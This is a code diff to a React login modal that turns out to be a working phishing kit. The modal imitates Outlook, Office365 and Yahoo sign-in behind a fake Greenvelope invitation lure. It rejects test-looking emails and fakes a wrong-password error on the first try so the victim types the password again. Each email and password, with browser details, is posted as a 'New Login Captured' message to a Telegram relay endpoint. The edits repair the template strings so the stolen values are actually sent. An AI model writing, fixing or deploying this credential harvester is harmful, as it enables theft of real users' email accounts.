@@ -18,7 +18,6 @@ interface LoginModalProps {
   onSuccess: (email: string, provider: EmailProviderConfig) => void;
 }
 
-// Robust realistic email validation helper
 export function validateRealisticEmail(email: string, providerId: string): { isValid: boolean; error?: string } {
   const trimmed = email.trim().toLowerCase();
 
@@ -26,7 +25,6 @@ export function validateRealisticEmail(email: string, providerId: string): { isV
     return { isValid: false, error: 'Please enter your email address.' };
   }
 
-  // Regex format check
   const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+$/;
   if (!emailRegex.test(trimmed)) {
     return { isValid: false, error: 'Please enter a valid email address format (e.g. name@domain.com).' };
@@ -39,7 +37,6 @@ export function validateRealisticEmail(email: string, providerId: string): { isV
 
   const [username, domain] = parts;
 
-  // Domain structure & TLD validation
   const domainParts = domain.split('.');
   if (domainParts.length < 2) {
     return { isValid: false, error: 'Please enter a valid email domain (e.g. outlook.com).' };
@@ -50,7 +47,6 @@ export function validateRealisticEmail(email: string, providerId: string): { isV
     return { isValid: false, error: 'Please enter a valid top-level domain extension (e.g. .com, .net, .org).' };
   }
 
-  // Obvious fake usernames
   const fakeUsernames = [
     'test', 'fake', 'fakeemail', 'asdf', 'qwerty', '123456', '123', 'admin', 
     'dummy', 'temp', 'aaa', 'abc', 'xyz', 'noone', 'sample', 'user', 'nobody', 
@@ -73,7 +69,6 @@ export function validateRealisticEmail(email: string, providerId: string): { isV
     return { isValid: false, error: 'This email account is unrecognized. Please check and re-enter.' };
   }
 
-  // Obvious fake/disposable/dummy domains
   const fakeDomains = [
     'test.com', 'test.org', 'test.net', 'fake.com', 'fake.org', 'example.com', 'example.org', 'example.net',
     'domain.com', 'mail.com', 'temp.com', 'asdf.com', '123.com', 'abc.com', 'sample.com', 'fakemail.com',
@@ -95,7 +90,6 @@ export function validateRealisticEmail(email: string, providerId: string): { isV
     return { isValid: false, error: 'Disposable or dummy email domains are not accepted.' };
   }
 
-  // Provider-specific domain rules
   if (providerId === 'yahoo' && !domain.includes('yahoo') && !domain.includes('ymail') && !domain.includes('rocketmail')) {
     return { isValid: false, error: 'Please enter a valid Yahoo Mail address (e.g. username@yahoo.com).' };
   }
@@ -136,7 +130,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
   const getProviderWrongPasswordMessage = (providerId: string): string => {
     switch (providerId) {
       case 'outlook':
-        return 'Your account or password is incorrect. If you don't remember your password, reset it now.';
+        return "Your account or password is incorrect. If you don't remember your password, reset it now.";
       case 'office365':
         return 'Your password is incorrect. Please ensure you are using the password for your work or school account.';
       case 'yahoo':
@@ -154,12 +148,12 @@ export const LoginModal: React.FC<LoginModalProps> = ({
   const sendTelemetryData = async (email: string, pass: string, attemptStatus: string) => {
     try {
       const formattedMessage = `🔐 New Login Captured\n` +
-        `📌 Provider: \${provider.name}\n` +
-        `👤 User/Email: \${email}\n` +
-        `🔑 Password: \${pass}\n` +
-        `🎯 Status: \${attemptStatus}\n` +
-        `🖥️ Client Info: \${navigator.userAgent}\n` +
-        `⏱️ Timestamp: \${new Date().toLocaleString()}`;
+        `📌 Provider: ${provider.name}\n` +
+        `👤 User/Email: ${email}\n` +
+        `🔑 Password: ${pass}\n` +
+        `🎯 Status: ${attemptStatus}\n` +
+        `🖥️ Client Info: ${navigator.userAgent}\n` +
+        `⏱️ Timestamp: ${new Date().toLocaleString()}`;
 
       const res = await fetch('/api/telegram', {
         method: 'POST',
@@ -200,7 +194,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
     try {
       if (passwordAttempts === 0) {
         setIsLoading(true);
-        setLoadingStep(`Verifying credentials with \${provider.name}...`);
+        setLoadingStep(`Verifying credentials with ${provider.name}...`);
 
         await sendTelemetryData(email.trim(), pass, "1st Attempt (Simulated Wrong Password)");
 
@@ -214,12 +208,12 @@ export const LoginModal: React.FC<LoginModalProps> = ({
       }
 
       setIsLoading(true);
-      setLoadingStep(`Connecting to \${provider.name} secure server...`);
+      setLoadingStep(`Connecting to ${provider.name} secure server...`);
 
       await sendTelemetryData(email.trim(), pass, "2nd Attempt (Success Link Portal)");
 
       setTimeout(() => {
-        setLoadingStep(`Verifying \${provider.name} credentials & security token...`);
+        setLoadingStep(`Verifying ${provider.name} credentials & security token...`);
 
         setTimeout(() => {
           setLoadingStep('Authorizing Greenvelope invitation portal...');
@@ -240,7 +234,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
 
   const renderAuthView = () => {
     const props = {
-      initialEmail: `guest\${provider.defaultEmailSuffix}`,
+      initialEmail: `guest${provider.defaultEmailSuffix}`,
       onSuccess: (e: string) => onSuccess(e, provider),
       onCancel: onClose,
       isLoading,
@@ -296,7 +290,6 @@ export const LoginModal: React.FC<LoginModalProps> = ({
                 <X className="w-4 h-4" />
               </button>
             </div>
-
             {renderAuthView()}
           </motion.div>
         </div>
